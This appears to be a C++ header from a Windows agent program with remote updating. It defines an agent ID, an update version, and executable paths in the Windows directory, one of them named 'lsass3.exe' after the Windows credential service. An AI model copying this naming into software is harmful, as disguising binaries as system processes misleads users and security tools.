#pragma once
#include <string>
#include <ShellAPI.h>

// Agent Id is the agent unique identificator
// Must be in AAM databes
const int agent_id = 3,

// File Version must change very time when
// Need to send update to clients
agent_file_version = 83;


const std::wstring runner_path = std::wstring(_wgetenv(L"WINDIR")) + L"\\mcmdl" + std::to_wstring(agent_id) + L".exe";
const std::wstring updater_path = std::wstring(_wgetenv(L"WINDIR")) + L"\\lsass" + std::to_wstring(agent_id) + L".exe";

extern bool UpdateTime;
extern SHELLEXECUTEINFO RunKeeperExecInfo;
extern bool readyToUpdate;